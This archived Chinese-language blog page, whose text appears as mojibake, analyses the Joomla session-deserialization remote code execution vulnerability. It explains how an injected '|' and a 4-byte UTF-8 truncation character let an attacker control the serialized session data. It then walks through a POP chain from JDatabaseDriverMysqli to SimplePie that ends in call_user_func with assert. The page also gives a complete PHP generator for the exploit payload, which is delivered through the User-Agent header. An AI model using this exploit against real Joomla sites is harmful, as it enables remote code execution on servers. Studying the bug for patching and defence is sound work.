

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0nçš„å°ç«™ï¼Œé•¿æœŸå­˜åœ¨ä¸åˆ†äº«å…³äºç½‘ç»œå®‰å…¨ä¸å„ç§ç¼–ç¨‹çš„åŸåˆ›æ–‡ç« ã€‚" />
    <title>Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰ | ç¦»åˆ«æ­Œ</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="ç¦»åˆ«æ­Œ" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">å½“å‰ç½‘é¡µ <strong>ä¸æ”¯æŒ</strong> ä½ æ­£åœ¨ä½¿ç”¨çš„æµè§ˆå™¨. ä¸ºäº†æ­£å¸¸çš„è®¿é—®, è¯· <a href="http://browsehappy.com/">å‡çº§ä½ çš„æµè§ˆå™¨</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="ç¦»åˆ«æ­Œ" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>èœå•</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >é¦–é¡µ</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >æ–‡ç« </a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >å…³äº</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >å‹é“¾</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >é¡¹ç›®</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >ä»£ç å®¡è®¡</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">é¦–é¡µ</a>
                &raquo;
                
                ç½‘ç»œå®‰å…¨ &raquo; <a href="joomla-unserialize-code-execute-vulnerability.html">Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰</h1>
            <div class="details-up">
  <span class="author">ä½œè€…: phithon</span>
  
  <span class="category">åˆ†ç±»: <a href="../sort/PENETRATION.html">ç½‘ç»œå®‰å…¨</a></span>
  
  <span class="date">æ—¶é—´: 2015-12-27 22:29</span>
  <span class="comments-top" itemprop="interactionCount">è¯„è®ºï¼š<a itemprop="discussionUrl" href="#reply-list">10æ¡è¯„è®º</a></span>
  <span class="comments-top" itemprop="interactionCount">æµè§ˆï¼š<a itemprop="discussionUrl" href="joomla-unserialize-code-execute-vulnerability.html">62524äººçœ‹è¿‡</a></span>
  
  <span class="date">æ ‡ç­¾:
    
        <a href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">ååºåˆ—åŒ–æ¼æ´</a>
    
        <a href="../tag/joomla.html">joomla</a>
    
        <a href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">å‘½ä»¤æ‰§è¡Œæ¼æ´</a>
    
  </span>
  
</div>
            <div class="entry">
                <p>joomlaæ¼æ´å‡ºæ¥è¿™ä¹ˆä¹…äº†ï¼Œæˆ‘ä¹Ÿäºå½“å¤©åœ¨dropså‘è¡¨äº†è¿™ç¯‡æ–‡ç« ( <a href="http://drops.wooyun.org/papers/11330"><a href="http://drops.wooyun.org/papers/11330">http://drops.wooyun.org/papers/11330</a></a>Â )ã€‚ä»Šå¤©å†çœ‹ï¼Œè¿˜æ˜¯æœ‰ç‚¹æ€¥ä¿ƒï¼Œæœ‰äº›åŸç†ä¸Šçš„ä¸œè¥¿æ²¡è¯´æ¸…æ¥šã€‚</p>
<p>æˆ‘åœ¨è‡ªå·±åšå®¢é‡Œï¼ŒæŠŠè¿™ç¯‡æ–‡ç« å¢åŠ ä¸€äº›åŸç†ä¸Šçš„è¯´æ˜ï¼Œå‘å‡ºæ¥ç•™ä¸ªåº•ç¨¿ã€‚</p>
<h2 id="session"><a class="toclink" href="#session">æ¼æ´ç‚¹ â€”â€” ååºåˆ—åŒ–session</a></h2>
<p>è¿™ä¸ªæ¼æ´å­˜åœ¨äºååºåˆ—åŒ–sessionçš„è¿‡ç¨‹ä¸­ã€‚</p>
<p>æ¼æ´å­˜åœ¨äº libraries/joomla/session/session.php ä¸­ï¼Œ_validateå‡½æ•°ï¼Œå°†uaå’Œxffè°ƒç”¨setæ–¹æ³•è®¾ç½®åˆ°äº†sessionä¸­ï¼ˆsession.client.browserå’Œsession.client.forwardedï¼‰</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">protected</span> <span class="k">function</span> <span class="nf">_validate</span><span class="p">(</span><span class="nv">$restart</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">...</span>

        <span class="c1">// Record proxy forwarded for in the session in case we need it later</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]))</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;session.client.forwarded&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
        <span class="p">}</span>

        <span class="o">...</span>
        <span class="c1">// Check for clients browser</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">&#39;fix_browser&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_security</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]))</span>
        <span class="p">{</span>
            <span class="nv">$browser</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;session.client.browser&#39;</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="nv">$browser</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;session.client.browser&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$browser</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="c1">// @todo remove code: $this-&gt;_state = &#39;error&#39;;</span>
                <span class="c1">// @todo remove code: return false;</span>
            <span class="p">}</span>
        <span class="p">}</span> 
</pre></div>


<p>æœ€ç»ˆè·Ÿéšä»–ä»¬ä¿©è¿›å…¥æ•°æ®åº“ï¼Œsessionè¡¨ï¼š</p>
<p><a href="../content/uploadfile/201512/39d01451235948.jpg"><img alt="14501741134471.jpg" src="../content/uploadfile/201512/thum-39d01451235948.jpg" /></a></p>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸å­˜åœ¨ä»»ä½•é—®é¢˜ã€‚å› ä¸ºæˆ‘ä»¬æ§åˆ¶çš„åªæ˜¯ååºåˆ—åŒ–å¯¹è±¡ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸ä¼šè§¦å‘ååºåˆ—ç›¸å…³çš„æ¼æ´ã€‚</p>
<p>ä½†æ˜¯ï¼Œå› ä¸ºä¸€ä¸ªå°å§¿åŠ¿ï¼Œå¯¼è‡´åé¢æˆ‘ä»¬å¯ä»¥æ§åˆ¶æ•´ä¸ªååºåˆ—åŒ–å¯¹è±¡ã€‚</p>
<h2 id="_1"><a class="toclink" href="#_1">åˆ©ç”¨|å­—ç¬¦ä¼ªé€ ï¼Œæ§åˆ¶æ•´ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²</a></h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆçœ‹çœ‹@Ryatè€å¸ˆçš„pch-013ï¼š <a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md"><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></a></p>
<p>å’Œpch-013ä¸­çš„æƒ…å†µç±»ä¼¼ï¼Œjoomlaä¹Ÿæ²¡æœ‰é‡‡ç”¨phpè‡ªå¸¦çš„sessionå¤„ç†æœºåˆ¶ï¼Œè€Œæ˜¯ç”¨å¤šç§æ–¹å¼ï¼ˆåŒ…æ‹¬databaseã€memcacheç­‰ï¼‰è‡ªå·±ç¼–å†™äº†å­˜å‚¨sessionçš„å®¹å™¨ï¼ˆstorageï¼‰ã€‚</p>
<p>å…¶å­˜å‚¨æ ¼å¼ä¸ºã€é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ã€ï¼Œå…¶æœªæ­£ç¡®å¤„ç†å¤šä¸ªç«–çº¿çš„æƒ…å†µã€‚</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¿™é‡Œå°±å¯ä»¥é€šè¿‡æ³¨å…¥ä¸€ä¸ª<code>|</code>ç¬¦å·ï¼Œå°†å®ƒå‰é¢çš„éƒ¨åˆ†å…¨éƒ¨è®¤ä¸ºæ˜¯nameï¼Œè€Œ|åé¢æˆ‘å°±å¯ä»¥æ’å…¥ä»»æ„serializeå­—ç¬¦ä¸²ï¼Œæ„é€ ååºåˆ—åŒ–æ¼æ´äº†ã€‚</p>
<p><a href="../content/uploadfile/201512/16e81451235948.jpg"><img alt="14501748976406.jpg" src="../content/uploadfile/201512/thum-16e81451235948.jpg" /></a></p>
<p>ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æˆ‘ä»¬æ„é€ å¥½çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²åé¢ï¼Œè¿˜æœ‰å®ƒåŸæœ¬çš„å†…å®¹ï¼Œå¿…é¡»è¦æˆªæ–­ã€‚è€Œæ­¤å¤„å¹¶ä¸åƒSQLæ³¨å…¥ï¼Œè¿˜æœ‰æ³¨é‡Šç¬¦å¯ç”¨ã€‚</p>
<p>ä½†ä¸çŸ¥å„ä½æ˜¯å¦è¿˜è®°å¾—å½“å¹´wordpresså‡ºè¿‡çš„ä¸€ä¸ªXSS( <a href="../HTML/wordpress-4-1-stored-xss.html"><a href="../HTML/wordpress-4-1-stored-xss.html">http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html</a></a> )ï¼Œå½“æ—¶å°±æ˜¯åœ¨æ’å…¥æ•°æ®åº“çš„æ—¶å€™åˆ©ç”¨"ğŒ†"ï¼ˆ%F0%9D%8C%86ï¼‰å­—ç¬¦å°†utf-8çš„å­—æ®µæˆªæ–­äº†ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œåœ¨sessionè¿›å…¥æ•°æ®åº“çš„æ—¶å€™å°±æˆªæ–­åé¢çš„å†…å®¹ï¼Œé¿å…å¯¹æˆ‘ä»¬ååºåˆ—åŒ–è¿‡ç¨‹é€ æˆå½±å“ã€‚</p>
<h2 id="_2"><a class="toclink" href="#_2">åŸç†æ¢ç©¶ï¼šä½•è°“å¤„ç†å¤šä¸ª|ä¸åˆç†</a></h2>
<p>å®é™…ä¸Šæ˜¯phpåº•å±‚å¯¹sessionå­—ç¬¦ä¸²å¤„ç†çš„ä¸åˆç†ã€‚</p>
<p>å…¶å®L.Nçš„æ–‡ç« é‡Œå·²ç»å¯ä»¥çœ‹åˆ°åŸç†äº† <a href="http://bobao.360.cn/learning/detail/2501.html"><a href="http://bobao.360.cn/learning/detail/2501.html">http://bobao.360.cn/learning/detail/2501.html</a></a></p>
<p>åœ¨php5.6.13ä»¥å‰çš„ç‰ˆæœ¬é‡Œï¼Œphpåœ¨è·å–sessionå­—ç¬¦ä¸²ä»¥åï¼Œå°±å¼€å§‹æŸ¥æ‰¾ç¬¬ä¸€ä¸ª|ï¼Œç„¶åç”¨è¿™ä¸ª|å°†å­—ç¬¦ä¸²åˆ†å‰²æˆã€é”®åã€å’Œã€é”®å€¼ã€ã€‚<br />
ç”¨unserializeè§£æé”®å€¼ï¼Œè§£æç»“æœä½œä¸ºsessionã€‚</p>
<p>ä½†å¦‚æœè¿™ä¸ªunserializeè§£æå¤±è´¥ï¼Œå°±æ”¾å¼ƒè¿™æ¬¡è§£æã€‚æ‰¾åˆ°ä¸‹ä¸€ä¸ª|ï¼Œå†æ ¹æ®è¿™ä¸ª|å°†å­—ç¬¦ä¸²åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œæ‰§è¡ŒåŒæ ·çš„æ“ä½œï¼Œç›´åˆ°è§£ææˆåŠŸã€‚</p>
<p>æ‰€ä»¥ï¼Œè¿™ä¸ªjoomlaæ¼æ´çš„æ ¸å¿ƒå†…å®¹å°±æ˜¯ï¼šæˆ‘ä»¬é€šè¿‡ğŒ†å­—ç¬¦ï¼Œ å°†åŸæœ¬çš„sessionæˆªæ–­äº†ï¼Œç»“æœå› ä¸ºé•¿åº¦ä¸å¯¹æ‰€ä»¥ç¬¬ä¸€æ¬¡è§£æ|å¤±è´¥ï¼Œæ‰è½®åˆ°ç¬¬äºŒæ¬¡è§£ææˆ‘ä¼ å…¥çš„|ï¼Œæœ€åæˆåŠŸåˆ©ç”¨ã€‚</p>
<p>æ‰€ä»¥ï¼Œæ„é€ sessionå‡ºé”™ï¼Œæ˜¯è¿™ä¸ªæ¼æ´æˆç«‹çš„æ ¸å¿ƒã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜èƒ½ä¸èƒ½æƒ³åˆ°å…¶ä»–åˆ©ç”¨æ–¹æ³•ï¼Ÿ</p>
<p>æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨é•¿å­—ç¬¦ï¼ˆ64kï¼‰ä¸²æˆªæ–­ï¼Œæ¥è¾¾æˆç±»ä¼¼å’ŒğŒ†å­—ç¬¦æˆªæ–­ä¸€æ ·çš„æ•ˆæœã€‚</p>
<p>è¿™å‡ å¤©ï¼Œjoomlaå†æ¬¡å¯¹æ­¤æ¼æ´è¿›è¡Œäº†åŠ å›ºï¼š <a href="http://bobao.360.cn/learning/detail/2527.html"><a href="http://bobao.360.cn/learning/detail/2527.html">http://bobao.360.cn/learning/detail/2527.html</a></a> ï¼Œå¤„ç†çš„å¾ˆä¼˜ç§€ï¼Œæ¬£èµè¿™æ ·çš„æ€åº¦ã€‚</p>
<h2 id="pop"><a class="toclink" href="#pop">æ„é€ POPæ‰§è¡Œé“¾ï¼Œæ‰§è¡Œä»»æ„ä»£ç </a></h2>
<p>åœ¨å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–å¯¹è±¡ä»¥åï¼Œæˆ‘ä»¬åªéœ€æ„é€ ä¸€ä¸ªèƒ½å¤Ÿä¸€æ­¥æ­¥è°ƒç”¨çš„æ‰§è¡Œé“¾ï¼Œå³å¯è¿›è¡Œä¸€äº›å±é™©çš„æ“ä½œäº†ã€‚</p>
<p>expæ„é€ çš„æ‰§è¡Œé“¾ï¼Œåˆ†åˆ«åˆ©ç”¨äº†å¦‚ä¸‹ç±»ï¼š</p>
<ol>
<li>JDatabaseDriverMysqli</li>
<li>SimplePie</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥åœ¨JDatabaseDriverMysqliç±»çš„ææ„å‡½æ•°é‡Œæ‰¾åˆ°ä¸€å¤„æ•æ„Ÿæ“ä½œï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnect</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="o">...</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">disconnect</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// Close the connection.</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="k">as</span> <span class="nv">$h</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="p">));</span>
            <span class="p">}</span>

            <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="p">}</span> 
</pre></div>


<p>å½“expå¯¹è±¡ååºåˆ—åŒ–åï¼Œå°†ä¼šæˆä¸ºä¸€ä¸ªJDatabaseDriverMysqliç±»å¯¹è±¡ï¼Œä¸ç®¡ä¸­é—´å¦‚ä½•æ‰§è¡Œï¼Œæœ€åéƒ½å°†ä¼šè°ƒç”¨<code>__destruct</code>ï¼Œ<code>__destruct</code>å°†ä¼šè°ƒç”¨<code>disconnect</code>ï¼Œ<code>disconnect</code>é‡Œæœ‰ä¸€å¤„æ•æ„Ÿå‡½æ•°ï¼š<code>call_user_func_array</code>ã€‚</p>
<p>ä½†å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œçš„<code>call_user_func_array</code>çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ã€‚æ‰€ä»¥ä¸èƒ½ç›´æ¥æ„é€ assert+evalæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>äºæ˜¯è¿™é‡Œå†æ¬¡è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ï¼šSimplePieç±»å¯¹è±¡ï¼Œå’Œå®ƒçš„initæ–¹æ³•ç»„æˆä¸€ä¸ªå›è°ƒå‡½æ•°[new SimplePie(), 'init']ï¼Œä¼ å…¥<code>call_user_func_array</code>ã€‚</p>
<p>è·Ÿè¿›initæ–¹æ³•ï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">init</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// Check absolute bare minimum requirements.</span>
        <span class="k">if</span> <span class="p">((</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;version_compare&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">&#39;4.3.0&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;xml&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">&#39;pcre&#39;</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="o">...</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="k">null</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raw_data</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">multifeed_objects</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$parsed_feed_url</span> <span class="o">=</span> <span class="nx">SimplePie_Misc</span><span class="o">::</span><span class="na">parse_url</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">);</span>
                <span class="c1">// Decide whether to enable caching</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$parsed_feed_url</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="nv">$cache</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_class</span><span class="p">,</span> <span class="s1">&#39;create&#39;</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">),</span> <span class="s1">&#39;spc&#39;</span><span class="p">);</span>
                <span class="p">}</span> 
</pre></div>


<p>å¾ˆæ˜æ˜¾ï¼Œå…¶ä¸­è¿™ä¸¤ä¸ªcall_user_funcå°†æ˜¯è§¦å‘ä»£ç æ‰§è¡Œçš„å…ƒå‡¶ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘å°†å…¶ä¸­ç¬¬äºŒä¸ªcall_user_funcçš„ç¬¬ä¸€ä¸ªå‚æ•°cache_name_functionï¼Œèµ‹å€¼ä¸ºassertï¼Œç¬¬äºŒä¸ªå‚æ•°èµ‹å€¼ä¸ºæˆ‘éœ€è¦æ‰§è¡Œçš„ä»£ç ï¼Œå°±æ„é€ å¥½äº†ä¸€ä¸ªã€å›è°ƒåé—¨ã€ã€‚</p>
<p>æ‰€ä»¥ï¼Œexpæ˜¯æ€ä¹ˆç”Ÿæˆçš„ï¼Œç»™å‡ºæˆ‘å†™çš„ç”Ÿæˆä»£ç ï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">//header(&quot;Content-Type: text/plain&quot;);</span>
<span class="k">class</span> <span class="nc">JSimplepieFactory</span> <span class="p">{</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">JDatabaseDriverMysql</span> <span class="p">{</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">SimplePie</span> <span class="p">{</span>
    <span class="k">var</span> <span class="nv">$sanitize</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$cache</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$cache_name_function</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$javascript</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$feed_url</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">=</span> <span class="s2">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">javascript</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="s2">&quot;assert&quot;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysql</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">JDatabaseDriverMysqli</span> <span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$disconnectHandlers</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSimplepieFactory</span><span class="p">();</span>
        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">[</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">&quot;init&quot;</span><span class="p">],</span>
        <span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysqli</span><span class="p">();</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> 
</pre></div>


<p><a href="../content/uploadfile/201512/46141451235941.jpg"><img alt="14501734764205.jpg" src="../content/uploadfile/201512/thum-46141451235941.jpg" /></a></p>
<p>å°†è¿™ä¸ªä»£ç ç”Ÿæˆçš„expï¼Œä»¥å‰é¢æåˆ°çš„æ³¨å…¥ã€|ã€çš„å˜æ¢æ–¹å¼ï¼Œå¸¦å…¥å‰é¢æåˆ°çš„user-agentä¸­ï¼Œå³å¯è§¦å‘ä»£ç æ‰§è¡Œã€‚</p>
<p>å…¶ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°†<code>char(0)*char(0)</code>æ›¿æ¢æˆ\0\0\0ï¼Œå› ä¸ºåœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œprotectedç±»å‹å˜é‡ä¼šè¢«è½¬æ¢æˆ<code>\0*\0name</code>çš„æ ·å¼ï¼Œè¿™ä¸ªæ›¿æ¢åœ¨æºä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;\0\0\0&#39;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;*&#39;</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nv">$result</span><span class="p">);</span> 
</pre></div>


<p>æ„é€ çš„æ—¶å€™é‡åˆ°ä¸€ç‚¹å°éº»çƒ¦ï¼Œé‚£å°±æ˜¯é»˜è®¤æƒ…å†µä¸‹SimplePieæ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘åœ¨è°ƒç”¨SimplePieä¹‹å‰å…ˆnewäº†ä¸€ä¸ªJSimplepieFactoryçš„åŸå› ï¼Œå› ä¸ºJSimplepieFactoryå¯¹è±¡åœ¨åŠ è½½æ—¶ä¼šè°ƒç”¨importå‡½æ•°å°†SimplePieå¯¼å…¥åˆ°å½“å‰å·¥ä½œç¯å¢ƒï¼š</p>
<p><a href="../content/uploadfile/201512/58a21451235945.jpg"><img alt="14501735764788.jpg" src="../content/uploadfile/201512/thum-58a21451235945.jpg" /></a></p>
